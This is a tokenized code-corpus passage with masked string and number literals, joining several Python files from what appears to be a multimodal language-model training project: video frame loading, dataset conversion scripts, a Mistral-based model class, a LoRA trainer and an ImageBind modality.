<EOL> return file_path <EOL> def _read_video_pyav ( container , indices ) : <EOL> frames = [ ] <EOL> container . seek ( <NUM_LIT> ) <EOL> start_index = indices [ <NUM_LIT> ] <EOL> end_index = indices [ - <NUM_LIT> ] <EOL> for i , frame in enumerate ( container . decode ( video = <NUM_LIT> ) ) : <EOL> if i > end_index : <EOL> break <EOL> if i >= start_index and i in indices : <EOL> frames . append ( frame ) <EOL> return np . stack ( [ x . to_ndarray ( format = "<STR_LIT>" ) for x in frames ] ) <EOL> def _sample_frame_indices ( clip_len , frame_sample_rate , seg_len ) : <EOL> converted_len = int ( clip_len * frame_sample_rate ) <EOL> end_idx = np . random . randint ( converted_len , seg_len ) <EOL> start_idx = end_idx - converted_len <EOL> indices = np . linspace ( start_idx , end_idx , num = clip_len ) <EOL> indices = np . clip ( indices , start_idx , end_idx - <NUM_LIT> ) . astype ( np . int64 ) <EOL> return indices <EOL> def load_video ( <EOL> input_ : str , <EOL> frames : int = <NUM_LIT> , <EOL> frame_sample_rate : int = <NUM_LIT> , <EOL> start_time : Optional [ int ] = None , <EOL> end_time : Optional [ int ] = None , <EOL> ) -> np . ndarray : <EOL> import av <EOL> delete_file = False <EOL> if isinstance ( input_ , dict ) and "<STR_LIT>" and input_ . get ( "<STR_LIT>" , "<STR_LIT>" ) : <EOL> file_path = _download_yt_video ( input_ [ "<STR_LIT>" ] ) <EOL> delete_file = True <EOL> elif isinstance ( input_ , str ) and "<STR_LIT>" in input_ : <EOL> file_path = _download_yt_video ( input_ ) <EOL> delete_file = True <EOL> elif isinstance ( input_ , str ) : <EOL> file_path = input_ <EOL> else : <EOL> raise ValueError ( f"<STR_LIT>" ) <EOL> if start_time is not None or end_time is not None : <EOL> start_time = start_time if start_time is not None else <NUM_LIT> <EOL> end_time = end_time if end_time is not None else "<STR_LIT>" <EOL> trim_file_path = f"<STR_LIT>" <EOL> subprocess . run ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> file_path , <EOL> "<STR_LIT>" , <EOL> str ( start_time ) , <EOL> "<STR_LIT>" , <EOL> str ( end_time ) , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> trim_file_path , <EOL> ] <EOL> ) <EOL> file_path = trim_file_path <EOL> container = av . open ( file_path ) <EOL> indices = _sample_frame_indices ( <EOL> clip_len = frames , <EOL> frame_sample_rate = frame_sample_rate , <EOL> seg_len = container . streams . video [ <NUM_LIT> ] . frames , <EOL> ) <EOL> video = _read_video_pyav ( container , indices ) <EOL> if delete_file : <EOL> os . remove ( file_path ) <EOL> return video <EOL> </s>
<s> from typing import List <EOL> import random <EOL> import argparse <EOL> import json <EOL> from huggingface_hub import hf_hub_download <EOL> from datasets import Dataset <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> PRETRAIN_PHRASES = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> def _timestamp_to_seconds ( timestamp : str ) : <EOL> parts = timestamp . split ( "<STR_LIT>" ) <EOL> seconds = float ( parts [ - <NUM_LIT> ] ) <EOL> seconds += float ( parts [ - <NUM_LIT> ] ) * <NUM_LIT> <EOL> seconds += float ( parts [ - <NUM_LIT> ] ) * <NUM_LIT> * <NUM_LIT> <EOL> return seconds <EOL> def _write_convo ( row ) -> List : <EOL> video = { <EOL> "<STR_LIT>" : "<STR_LIT>" + row [ "<STR_LIT>" ] , <EOL> "<STR_LIT>" : _timestamp_to_seconds ( row [ "<STR_LIT>" ] ) , <EOL> "<STR_LIT>" : _timestamp_to_seconds ( row [ "<STR_LIT>" ] ) , <EOL> } <EOL> example = { <EOL> "<STR_LIT>" : [ video ] , <EOL> } <EOL> phrase = random . choice ( PRETRAIN_PHRASES ) <EOL> example [ "<STR_LIT>" ] = [ <EOL> { <EOL> "<STR_LIT>" : ROLE_USER , <EOL> "<STR_LIT>" : phrase , <EOL> } , <EOL> { <EOL> "<STR_LIT>" : ROLE_ASSISTANT , <EOL> "<STR_LIT>" : row [ "<STR_LIT>" ] , <EOL> } , <EOL> ] <EOL> return example <EOL> def main ( args ) : <EOL> path = hf_hub_download ( <EOL> repo_id = "<STR_LIT>" , filename = "<STR_LIT>" , repo_type = "<STR_LIT>" <EOL> ) <EOL> rows = [ ] <EOL> with open ( path , "<STR_LIT>" ) as f : <EOL> for line in f : <EOL> rows . append ( json . loads ( line ) ) <EOL> print ( "<STR_LIT>" , len ( rows ) ) <EOL> if len ( rows ) > args . max_examples : <EOL> rows = random . sample ( rows , k = args . max_examples ) <EOL> def gen ( subset_rows ) : <EOL> for row in subset_rows : <EOL> try : <EOL> yield _write_convo ( row ) <EOL> except Exception as e : <EOL> print ( e ) <EOL> ds = Dataset . from_generator ( gen , gen_kwargs = { "<STR_LIT>" : rows } , num_proc = <NUM_LIT> ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , "<STR_LIT>" , type = str , default = "<STR_LIT>" <EOL> ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> from typing import List , Optional , Tuple , Union <EOL> import torch <EOL> import torch . nn as nn <EOL> from torch . nn import CrossEntropyLoss <EOL> from transformers import ( <EOL> AutoConfig , <EOL> AutoModelForCausalLM , <EOL> MistralConfig , <EOL> MistralModel , <EOL> MistralForCausalLM , <EOL> ) <EOL> from transformers . modeling_outputs import CausalLMOutputWithPast <EOL> from multi_token . language_models . base_model import ( <EOL> LMMMetaModel , <EOL> LMMMetaForCausalLM , <EOL> ) <EOL> class MistralLMMConfig ( MistralConfig ) : <EOL> model_type = "<STR_LIT>" <EOL> class MistralLMMModel ( LMMMetaModel , MistralModel ) : <EOL> config_class = MistralLMMConfig <EOL> def __init__ ( self , config : MistralLMMConfig ) : <EOL> super ( MistralLMMModel , self ) . __init__ ( config ) <EOL> class MistralLMMForCausalLM ( MistralForCausalLM , LMMMetaForCausalLM ) : <EOL> config_class = MistralLMMConfig <EOL> def __init__ ( self , config ) : <EOL> super ( MistralForCausalLM , self ) . __init__ ( config ) <EOL> self . model = MistralLMMModel ( config ) <EOL> self . vocab_size = config . vocab_size <EOL> self . lm_head = nn . Linear ( config . hidden_size , config . vocab_size , bias = False ) <EOL> self . modalities = None <EOL> self . post_init ( ) <EOL> def get_model ( self ) -> "<STR_LIT>" : <EOL> return self . model <EOL> def forward ( <EOL> self , <EOL> input_ids : torch . LongTensor = None , <EOL> attention_mask : Optional [ torch . Tensor ] = None , <EOL> position_ids : Optional [ torch . LongTensor ] = None , <EOL> past_key_values : Optional [ List [ torch . FloatTensor ] ] = None , <EOL> inputs_embeds : Optional [ torch . FloatTensor ] = None , <EOL> labels : Optional [ torch . LongTensor ] = None , <EOL> use_cache : Optional [ bool ] = None , <EOL> output_attentions : Optional [ bool ] = None , <EOL> output_hidden_states : Optional [ bool ] = None , <EOL> return_dict : Optional [ bool ] = None , <EOL> ** kwargs <EOL> ) -> Union [ Tuple , CausalLMOutputWithPast ] : <EOL> output_attentions = ( <EOL> output_attentions <EOL> if output_attentions is not None <EOL> else self . config . output_attentions <EOL> ) <EOL> output_hidden_states = ( <EOL> output_hidden_states <EOL> if output_hidden_states is not None <EOL> else self . config . output_hidden_states <EOL> ) <EOL> return_dict = ( <EOL> return_dict if return_dict is not None else self . config . use_return_dict <EOL> ) <EOL> ( <EOL> input_ids , <EOL> attention_mask , <EOL> past_key_values , <EOL> inputs_embeds , <EOL> labels , <EOL> ) = self . prepare_inputs_labels_for_multimodal ( <EOL> input_ids , attention_mask , past_key_values , labels , ** kwargs <EOL> ) <EOL> outputs = self . model ( <EOL> input_ids = input_ids , <EOL> attention_mask = attention_mask , <EOL> position_ids = position_ids , <EOL> past_key_values = past_key_values , <EOL> inputs_embeds = inputs_embeds , <EOL> use_cache = use_cache , <EOL> output_attentions = output_attentions , <EOL> output_hidden_states = output_hidden_states , <EOL> return_dict = return_dict , <EOL> ) <EOL> hidden_states = outputs [ <NUM_LIT> ] <EOL> logits = self . lm_head ( hidden_states ) <EOL> logits = logits . float ( ) <EOL> loss = None <EOL> if labels is not None : <EOL> shift_logits = logits [ ... , : - <NUM_LIT> , : ] . contiguous ( ) <EOL> shift_labels = labels [ ... , <NUM_LIT> : ] . contiguous ( ) <EOL> loss_fct = CrossEntropyLoss ( ) <EOL> shift_logits = shift_logits . view ( - <NUM_LIT> , self . config . vocab_size ) <EOL> shift_labels = shift_labels . view ( - <NUM_LIT> ) <EOL> shift_labels = shift_labels . to ( shift_logits . device ) <EOL> loss = loss_fct ( shift_logits , shift_labels ) <EOL> if not return_dict : <EOL> output = ( logits , ) + outputs [ <NUM_LIT> : ] <EOL> return ( loss , ) + output if loss is not None else output <EOL> return CausalLMOutputWithPast ( <EOL> loss = loss , <EOL> logits = logits , <EOL> past_key_values = outputs . past_key_values , <EOL> hidden_states = outputs . hidden_states , <EOL> attentions = outputs . attentions , <EOL> ) <EOL> def prepare_inputs_for_generation ( <EOL> self , <EOL> input_ids , <EOL> past_key_values = None , <EOL> attention_mask = None , <EOL> inputs_embeds = None , <EOL> modality_inputs = None , <EOL> ** kwargs <EOL> ) : <EOL> if past_key_values : <EOL> input_ids = input_ids [ : , - <NUM_LIT> : ] <EOL> if inputs_embeds is not None : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> model_inputs = { <EOL> "<STR_LIT>" : input_ids , <EOL> "<STR_LIT>" : None , <EOL> "<STR_LIT>" : past_key_values , <EOL> "<STR_LIT>" : kwargs . get ( "<STR_LIT>" ) , <EOL> "<STR_LIT>" : attention_mask , <EOL> ** ( modality_inputs or { } ) , <EOL> } <EOL> return model_inputs <EOL> AutoConfig . register ( "<STR_LIT>" , MistralLMMConfig ) <EOL> AutoModelForCausalLM . register ( MistralLMMConfig , MistralLMMForCausalLM ) <EOL> </s>
<s> from typing import Optional , List <EOL> from dataclasses import field , dataclass <EOL> import logging <EOL> import subprocess <EOL> import pathlib <EOL> import torch <EOL> import shutil <EOL> import glob <EOL> import os <EOL> import transformers <EOL> from transformers . trainer_utils import PREFIX_CHECKPOINT_DIR <EOL> from transformers import Trainer <EOL> from multi_token . training_data import ( <EOL> DataArguments , <EOL> LMMDataset , <EOL> DataCollatorForSupervisedLMMDataset , <EOL> ) <EOL> from multi_token . model_utils import ( <EOL> make_model_lora , <EOL> get_peft_state , <EOL> get_peft_state_non_lora , <EOL> fix_tokenizer , <EOL> ) <EOL> from multi_token . modalities . base_modality import Modality <EOL> README_TEMPLATE = <EOL> @ dataclass <EOL> class TrainingArguments ( transformers . TrainingArguments ) : <EOL> cache_dir : Optional [ str ] = field ( default = None ) <EOL> remove_unused_columns : bool = field ( default = False ) <EOL> optim : str = field ( default = "<STR_LIT>" ) <EOL> model_max_length : int = field ( <EOL> default = <NUM_LIT> , <EOL> metadata = { <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> ) <EOL> double_quant : bool = field ( <EOL> default = True , <EOL> metadata = { <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> ) <EOL> quant_type : str = field ( <EOL> default = "<STR_LIT>" , <EOL> metadata = { <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> ) <EOL> pretrain_projectors : bool = field ( default = False ) <EOL> pretrained_projectors_path : Optional [ str ] = field ( default = None ) <EOL> bits : int = field ( default = <NUM_LIT> , metadata = { "<STR_LIT>" : "<STR_LIT>" } ) <EOL> lora_enable : bool = False <EOL> lora_r : int = <NUM_LIT> <EOL> lora_alpha : int = <NUM_LIT> <EOL> lora_dropout : float = <NUM_LIT> <EOL> lora_weight_path : str = "<STR_LIT>" <EOL> lora_bias : str = "<STR_LIT>" <EOL> @ dataclass <EOL> class ModelArguments : <EOL> model_name_or_path : str = field ( default = "<STR_LIT>" ) <EOL> model_cls : str = field ( default = "<STR_LIT>" ) <EOL> modality_builder : str = field ( default = "<STR_LIT>" ) <EOL> model_lora_path : Optional [ str ] = field ( default = None ) <EOL> class LMMTrainer ( Trainer ) : <EOL> def _save_checkpoint ( self , model , trial , metrics = None ) : <EOL> checkpoint_folder = f"<STR_LIT>" <EOL> run_dir = self . _get_output_dir ( trial = trial ) <EOL> output_dir = os . path . join ( run_dir , checkpoint_folder ) <EOL> self . _save_extras ( output_dir ) <EOL> super ( LMMTrainer , self ) . _save_checkpoint ( model , trial , metrics ) <EOL> def _save ( self , output_dir : Optional [ str ] = None , state_dict = None ) : <EOL> self . _save_extras ( output_dir ) <EOL> super ( LMMTrainer , self ) . _save ( output_dir , state_dict ) <EOL> for unused_dir in glob . iglob ( os . path . join ( output_dir , "<STR_LIT>" ) ) : <EOL> shutil . rmtree ( unused_dir ) <EOL> def _save_extras ( self , output_dir : Optional [ str ] = None ) : <EOL> self . model . config . save_pretrained ( output_dir ) <EOL> non_lora_state_dict = get_peft_state_non_lora ( self . model . named_parameters ( ) ) <EOL> torch . save ( <EOL> non_lora_state_dict , <EOL> os . path . join ( output_dir , "<STR_LIT>" ) , <EOL> ) <EOL> def _get_training_devices_dump ( ) -> str : <EOL> out = subprocess . check_output ( <EOL> [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> ) <EOL> return out . decode ( "<STR_LIT>" ) . strip ( ) <EOL> def train_for_modalities ( <EOL> model_cls , <EOL> training_args : TrainingArguments , <EOL> model_args : ModelArguments , <EOL> data_args : DataArguments , <EOL> modalities : List [ Modality ] , <EOL> ) : <EOL> for m in modalities : <EOL> m . to ( <EOL> dtype = torch . bfloat16 if training_args . bf16 else torch . float16 , <EOL> device = training_args . device , <EOL> ) <EOL> tokenizer = transformers . AutoTokenizer . from_pretrained ( <EOL> model_args . model_name_or_path , <EOL> cache_dir = training_args . cache_dir , <EOL> model_max_length = training_args . model_max_length , <EOL> padding_side = "<STR_LIT>" , <EOL> use_fast = False , <EOL> ) <EOL> fix_tokenizer ( tokenizer ) <EOL> dataset = LMMDataset ( data_args , tokenizer , modalities ) <EOL> collator = DataCollatorForSupervisedLMMDataset ( tokenizer , modalities ) <EOL> model = model_cls . from_pretrained ( <EOL> model_args . model_name_or_path , <EOL> cache_dir = training_args . cache_dir , <EOL> ) <EOL> model . modalities = modalities <EOL> model . config . use_cache = False <EOL> model . config . model_cls = model_cls . __name__ <EOL> model . config . modality_builder = model_args . modality_builder <EOL> if training_args . gradient_checkpointing : <EOL> if hasattr ( model , "<STR_LIT>" ) : <EOL> model . enable_input_require_grads ( ) <EOL> else : <EOL> def make_inputs_require_grad ( module , input , output ) : <EOL> output . requires_grad_ ( True ) <EOL> model . get_input_embeddings ( ) . register_forward_hook ( make_inputs_require_grad ) <EOL> if model_args . model_lora_path : <EOL> raise ValueError ( <EOL> "<STR_LIT>" <EOL> ) <EOL> if training_args . lora_enable : <EOL> logging . info ( "<STR_LIT>" ) <EOL> model = make_model_lora ( model , training_args ) <EOL> if training_args . pretrained_projectors_path : <EOL> projector_weights = torch . load ( <EOL> training_args . pretrained_projectors_path , map_location = "<STR_LIT>" <EOL> ) <EOL> projector_weights = { <EOL> k : v for k , v in projector_weights . items ( ) if "<STR_LIT>" in k <EOL> } <EOL> else : <EOL> projector_weights = { } <EOL> model . get_model ( ) . initialize_modules ( modalities , projector_weights ) <EOL> if training_args . pretrain_projectors : <EOL> model . requires_grad_ ( False ) <EOL> for m in modalities : <EOL> proj = getattr ( model . get_model ( ) , m . name + "<STR_LIT>" ) <EOL> for p in proj . parameters ( ) : <EOL> p . requires_grad = True <EOL> os . makedirs ( training_args . output_dir , exist_ok = True ) <EOL> with open ( <EOL> os . path . join ( training_args . output_dir , "<STR_LIT>" ) , "<STR_LIT>" <EOL> ) as f : <EOL> for name , param in model . named_parameters ( ) : <EOL> f . write ( f"<STR_LIT>" ) <EOL> with open ( os . path . join ( training_args . output_dir , "<STR_LIT>" ) , "<STR_LIT>" ) as f : <EOL> modalities_text = [ <EOL> f"<STR_LIT>" <EOL> for m in modalities <EOL> ] <EOL> readme_text = README_TEMPLATE . format ( <EOL> base_model = model_args . model_name_or_path , <EOL> dataset = data_args . dataset_path , <EOL> dataset_example = repr ( dataset . get_example ( ) ) , <EOL> num_examples = len ( dataset ) , <EOL> modalities = "<STR_LIT>" . join ( modalities_text ) , <EOL> training_devices_dump = _get_training_devices_dump ( ) , <EOL> repr_model = f"<STR_LIT>" , <EOL> ) <EOL> f . write ( readme_text ) <EOL> trainer = LMMTrainer ( <EOL> model = model , <EOL> tokenizer = tokenizer , <EOL> args = training_args , <EOL> data_collator = collator , <EOL> train_dataset = dataset , <EOL> eval_dataset = None , <EOL> ) <EOL> if list ( pathlib . Path ( training_args . output_dir ) . glob ( f"<STR_LIT>" ) ) : <EOL> trainer . train ( resume_from_checkpoint = True ) <EOL> else : <EOL> trainer . train ( ) <EOL> trainer . save_state ( ) <EOL> model . config . use_cache = True <EOL> model . config . save_pretrained ( training_args . output_dir ) <EOL> state_dict = get_peft_state ( model . named_parameters ( ) , training_args . lora_bias ) <EOL> model . save_pretrained ( training_args . output_dir , state_dict = state_dict ) <EOL> non_lora_state_dict = get_peft_state_non_lora ( model . named_parameters ( ) ) <EOL> torch . save ( <EOL> non_lora_state_dict , <EOL> os . path . join ( training_args . output_dir , "<STR_LIT>" ) , <EOL> ) <EOL> </s>
<s> from typing import List <EOL> import random <EOL> import argparse <EOL> import json <EOL> from datasets import Dataset , load_dataset <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> def _write_convo ( row ) -> List : <EOL> video = "<STR_LIT>" + row [ "<STR_LIT>" ] [ <NUM_LIT> : ] <EOL> example = { <EOL> "<STR_LIT>" : [ video ] , <EOL> } <EOL> example [ "<STR_LIT>" ] = [ <EOL> { <EOL> "<STR_LIT>" : ROLE_USER , <EOL> "<STR_LIT>" : row [ "<STR_LIT>" ] , <EOL> } , <EOL> { <EOL> "<STR_LIT>" : ROLE_ASSISTANT , <EOL> "<STR_LIT>" : row [ "<STR_LIT>" ] , <EOL> } , <EOL> ] <EOL> return example <EOL> def main ( args ) : <EOL> data = load_dataset ( "<STR_LIT>" , split = "<STR_LIT>" ) <EOL> def gen ( ) : <EOL> for row in data : <EOL> try : <EOL> yield _write_convo ( row ) <EOL> except Exception as e : <EOL> print ( e ) <EOL> ds = Dataset . from_generator ( gen ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , "<STR_LIT>" , type = str , default = "<STR_LIT>" <EOL> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> from typing import Dict , List <EOL> import os <EOL> import torch <EOL> import torch . nn as nn <EOL> from multi_token . modalities . base_modality import Modality <EOL> from multi_token . modalities . projectors import build_mlp_vector_projector <EOL> from multi_token . data_tools import with_local_files <EOL> IMAGE_BIND_FORCE_CPU = "<STR_LIT>" <EOL> IMAGE_BIND_EMBEDDING_SIZE = <NUM_LIT> <EOL> class ImageBindModule ( nn . Module ) : <EOL> def __init__ ( self ) : <EOL> super ( ) . __init__ ( ) <EOL> from imagebind . models import imagebind_model <EOL> from imagebind import data <EOL> data . BPE_PATH = os . path . join ( <EOL> os . path . dirname ( data . __file__ ) , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" <EOL> ) <EOL> self . model = imagebind_model . imagebind_huge ( pretrained = True ) <EOL> self . model . eval ( ) <EOL> self . model . requires_grad_ ( False ) <EOL> @ torch . no_grad ( ) <EOL> def forward ( self , items : Dict ) -> torch . Tensor : <EOL> forward_outs = self . model ( items ) <EOL> return forward_outs <EOL> @ property <EOL> def embedding_size ( self ) : <EOL> return IMAGE_BIND_EMBEDDING_SIZE <EOL> class ImageBindModality ( Modality ) : <EOL> def __init__ ( <EOL> self , <EOL> num_projector_layers : int = <NUM_LIT> , <EOL> num_tokens : int = <NUM_LIT> , <EOL> preprocess_device : str = "<STR_LIT>" , <EOL> ) : <EOL> self . module = ImageBindModule ( ) <EOL> self . dtype = torch . float32 <EOL> self . device = "<STR_LIT>" <EOL> self . imagebind_device = "<STR_LIT>" <EOL> self . preprocess_device = preprocess_device <EOL> self . num_projector_layers = num_projector_layers <EOL> self . num_tokens = num_tokens <EOL> def build_projector ( self , lm_hidden_size : int ) -> nn . Module : <EOL> return build_mlp_vector_projector ( <EOL> self . module . embedding_size , <EOL> lm_hidden_size , <EOL> num_layers = self . num_projector_layers , <EOL> num_tokens = self . num_tokens , <EOL> ) <EOL> @ property <EOL> def name ( self ) -> str : <EOL> return "<STR_LIT>" <EOL> @ property <EOL> def token ( self ) -> str : <EOL> return "<STR_LIT>" <EOL> @ property <EOL> def data_key ( self ) -> str : <EOL> return "<STR_LIT>" <EOL> @ property <EOL> def token_width ( self ) -> int : <EOL> return self . num_tokens <EOL> def to ( self , dtype : torch . dtype , device : torch . device ) -> "<STR_LIT>" : <EOL> self . device = device <EOL> self . dtype = dtype <EOL> if IMAGE_BIND_FORCE_CPU not in os . environ : <EOL> self . module . to ( device = device ) <EOL> self . imagebind_device = device <EOL> return self <EOL> def preprocess_rows ( self , rows : List [ Dict ] ) -> List [ List [ Dict ] ] : <EOL> from imagebind . models . imagebind_model import ModalityType <EOL> from imagebind import data <EOL> row_values = [ ] <EOL> for row in rows : <EOL> items = [ ] <EOL> with with_local_files ( row [ self . data_key ] ) as item_paths : <EOL> for item_path in item_paths : <EOL> ib_modality = filename_to_imagebind_modality ( item_path ) <EOL> if ib_modality == ModalityType . TEXT : <EOL> items . append ( <EOL> { <EOL> ModalityType . TEXT : data . load_and_transform_text ( <EOL> [ item_path ] , self . preprocess_device <EOL> ) <EOL> } <EOL> ) <EOL> elif ib_modality == ModalityType . VISION : <EOL> items . append ( <EOL> { <EOL> ModalityType . VISION : data . load_and_transform_vision_data ( <EOL> [ item_path ] , self . preprocess_device <EOL> ) <EOL> } <EOL> ) <EOL> elif ib_modality == ModalityType . AUDIO : <EOL> items . append ( <EOL> { <EOL> ModalityType . AUDIO : data . load_and_transform_audio_data ( <EOL> [ item_path ] , self . preprocess_device <EOL> ) <EOL> } <EOL> ) <EOL> else : <EOL> raise ValueError ( f"<STR_LIT>" ) <EOL> row_values . append ( items ) <EOL> return row_values <EOL> @ torch . no_grad ( ) <EOL> def forward ( self , encoded_values : List [ List [ Dict ] ] ) -> List [ torch . Tensor ] : <EOL> item_features = [ ] <EOL> for item_batch in encoded_values : <EOL> item_batch_emb = [ ] <EOL> for item in item_batch : <EOL> item = { <EOL> k : v . to ( device = self . imagebind_device , dtype = torch . float32 ) <EOL> for k , v in item . items ( ) <EOL> } <EOL> item_batch_emb . extend ( list ( self . module . forward ( item ) . values ( ) ) ) <EOL> item_features . append ( <EOL> torch . stack ( item_batch_emb ) . to ( device = self . device , dtype = self . dtype ) <EOL> ) <EOL> return item_features <EOL> def filename_to_imagebind_modality ( fn : str ) -> str : <EOL> from imagebind . models . imagebind_model import ModalityType <EOL> _ , ext = os . path . splitext ( fn ) <EOL> if ext in { "<STR_LIT>" } : <EOL> return ModalityType . AUDIO <EOL> elif ext in { "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" } : <EOL> return ModalityType . VISION <EOL> else : <EOL> return ModalityType . TEXT <EOL> </s>
<s> from typing import Dict , List , Optional , Any <EOL> from abc import ABC , abstractmethod <EOL> from functools import cached_property <EOL> import torch . nn as nn <EOL> import torch <EOL> class Modality ( ABC ) : <EOL> @ abstractmethod <EOL> def build_projector ( self , lm_hidden_size : int ) -> nn . Module : <EOL> pass <EOL> @ property <EOL> @ abstractmethod <EOL> def name ( self ) -> str : <EOL> pass <EOL> @ property <EOL> @ abstractmethod <EOL> def token ( self ) -> str : <EOL> pass <EOL> @ property <EOL> @ abstractmethod <EOL> def data_key ( self ) -> str : <EOL> pass <EOL> @ property <EOL> @ abstractmethod <EOL> def token_width ( self ) -> int : <EOL> pass <EOL> @ cached_property <EOL> def token_idx ( self ) -> int : <EOL> hash_ = sum ( ord ( c ) ** i for i , c in enumerate ( self . token ) ) <EOL> return - abs ( hash_ % <NUM_LIT> ) <EOL> @ abstractmethod <EOL> def preprocess_rows ( self , rows : List [ Dict ] ) -> List [ Optional [ Any ] ] : <EOL> pass <EOL> @ abstractmethod <EOL> def forward ( self , encoded_values : List [ Any ] ) -> List [ torch . Tensor ] : <EOL> pass <EOL> def to ( self , dtype : torch . dtype , device : torch . device ) -> "<STR_LIT>" : <EOL> return self <EOL> </s>
<s> from typing import List <EOL> import argparse <EOL> import json <EOL> import os <EOL> from datasets import Dataset <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> def _convert_convo ( convo ) -> List : <EOL> msgs = [ ] <EOL> for m in convo : <EOL> msgs . append ( <EOL> { <EOL> "<STR_LIT>" : { "<STR_LIT>" : ROLE_ASSISTANT , "<STR_LIT>" : ROLE_USER } [ m [ "<STR_LIT>" ] ] , <EOL> "<STR_LIT>" : m [ "<STR_LIT>" ] , <EOL> } <EOL> ) <EOL> return msgs <EOL> def _fix_path ( path ) : <EOL> parts = path . split ( "<STR_LIT>" ) <EOL> parts = [ parts [ <NUM_LIT> ] , parts [ <NUM_LIT> ] , parts [ <NUM_LIT> ] , * parts [ <NUM_LIT> : ] ] <EOL> new_path = os . path . join ( * parts ) <EOL> return new_path <EOL> def main ( args ) : <EOL> rows = [ ] <EOL> for json_fn in args . llava_json : <EOL> with open ( json_fn ) as f : <EOL> rows . extend ( json . load ( f ) ) <EOL> def gen ( rows ) : <EOL> for row in rows : <EOL> try : <EOL> img_path = row [ "<STR_LIT>" ] <EOL> except KeyError : <EOL> continue <EOL> fn = os . path . join ( args . image_folder , _fix_path ( img_path ) ) <EOL> if not os . path . exists ( fn ) : <EOL> print ( "<STR_LIT>" , fn ) <EOL> continue <EOL> yield { <EOL> "<STR_LIT>" : str ( row [ "<STR_LIT>" ] ) , <EOL> "<STR_LIT>" : [ fn ] , <EOL> "<STR_LIT>" : _convert_convo ( row [ "<STR_LIT>" ] ) , <EOL> } <EOL> ds = Dataset . from_generator ( gen , gen_kwargs = { "<STR_LIT>" : rows } , num_proc = args . num_proc ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str , action = "<STR_LIT>" ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> from typing import List <EOL> import argparse <EOL> import random <EOL> import json <EOL> import os <EOL> from datasets import Dataset <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> TYPES = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> REPLACEMENTS = { <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> } <EOL> TEMP_TOKEN = "<STR_LIT>" <EOL> EXCLUDE_WORDS = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> def _convert_convo ( convo ) -> List : <EOL> type_idx = TYPES . index ( random . choice ( TYPES ) ) <EOL> msgs = [ ] <EOL> for m in convo : <EOL> content = m [ "<STR_LIT>" ] . replace ( "<STR_LIT>" , TEMP_TOKEN ) <EOL> for k , v in REPLACEMENTS . items ( ) : <EOL> content = content . replace ( k , v [ type_idx ] ) <EOL> content = content . replace ( TEMP_TOKEN , "<STR_LIT>" ) <EOL> msgs . append ( <EOL> { <EOL> "<STR_LIT>" : { "<STR_LIT>" : ROLE_ASSISTANT , "<STR_LIT>" : ROLE_USER } [ m [ "<STR_LIT>" ] ] , <EOL> "<STR_LIT>" : content , <EOL> } <EOL> ) <EOL> return msgs <EOL> def _fix_path ( path ) : <EOL> parts = path . split ( "<STR_LIT>" ) <EOL> parts = [ parts [ <NUM_LIT> ] , parts [ <NUM_LIT> ] , parts [ <NUM_LIT> ] , * parts [ <NUM_LIT> : ] ] <EOL> new_path = os . path . join ( * parts ) <EOL> return new_path <EOL> def main ( args ) : <EOL> rows = [ ] <EOL> for json_fn in args . llava_json : <EOL> with open ( json_fn ) as f : <EOL> rows . extend ( json . load ( f ) ) <EOL> def 